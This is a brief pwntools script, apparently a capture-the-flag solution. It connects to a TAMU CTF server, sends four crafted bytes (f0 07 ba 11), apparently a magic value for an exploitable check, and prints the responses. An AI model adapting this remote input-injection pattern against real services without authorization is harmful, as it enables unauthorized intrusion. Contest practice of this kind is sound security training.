from pwn import *
r = remote("pwn.ctf.tamu.edu", 4321)
#r.sendline("what the fuck")
s = r.recv(1000)
print s
my_bytes = bytearray()
my_bytes.append(int('f0', 16))
my_bytes.append(int('07', 16))
my_bytes.append(int('ba', 16))
my_bytes.append(int('11', 16))
print(my_bytes)
r.sendline(my_bytes)
s = r.recv(1000)
print s